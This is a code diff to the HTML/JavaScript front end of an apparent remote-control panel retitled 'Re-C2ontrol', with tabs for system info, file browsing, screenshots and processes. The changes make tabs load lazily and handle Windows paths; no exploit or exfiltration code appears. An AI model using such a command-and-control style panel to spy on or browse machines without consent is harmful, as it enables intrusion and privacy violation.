@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Remote Control</title>
+    <title>Re-C2ontrol</title>
     <link rel="stylesheet" type="text/css" href="web/sup.css"/>
     <link rel="icon" type="image/x-icon" href="web/favicon.ico">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -94,13 +94,14 @@
         }
 
         /* Bottpanel styling */
+        /*
         .bottpanel {
             background-color: #222;
             color: white;
             text-align: center;
             padding: 10px;
             margin-top: 20px;
-        }
+        }*/
         .system-info {
             /* display: grid;
             grid-template-columns: 1fr 2fr; */
@@ -313,7 +314,10 @@
     </div>
 
     <script>
-        let currentPath = './';
+        let currentPath = '/';
+        let f_explorer = 1;
+        let sysinfo = 1;
+        let screensh = 1;
 
         function openTab(tabId, button) {
             // Hide all tab content
@@ -333,13 +337,22 @@
             
             switch(tabId) {
                 case 'sysinfo':
-                    fetchSystemInfo();
+                    if (sysinfo) {
+                        fetchSystemInfo();
+                        sysinfo = 0;                     
+                    }
                     break;
                 case 'fileExplorer':
-                    fetchFolderContents(currentPath);
+                    if (f_explorer) {
+                        fetchFolderContents(currentPath);
+                        f_explorer = 0;
+                    }
                     break;
                 case 'screenshot':
-                    takeScreenshot();
+                    if (screensh) {
+                        takeScreenshot();
+                        screensh = 0;
+                    }
                     break;
                 case 'processExplorer': 
                     fetchProcessContents();
@@ -359,6 +372,9 @@
             .then(response => response.json())
             .then(data => {
                 if (data.status === "OK") {
+                    if (data.systemName.toLowerCase().includes("windows")) {
+                        currentPath = "c:/";
+                    }
                     const systemInfoContainer = document.getElementById('systemInfoContainer');
                     systemInfoContainer.innerHTML = ''; // Clear existing info
 
@@ -585,7 +601,7 @@
         }
 
         function goBack() {
-            if (currentPath !== '/') {
+            if (currentPath !== '/' && currentPath !== "c:/") {
                 currentPath = currentPath.split('/').slice(0, -2).join('/') + '/';
                 fetchFolderContents(currentPath);
             }
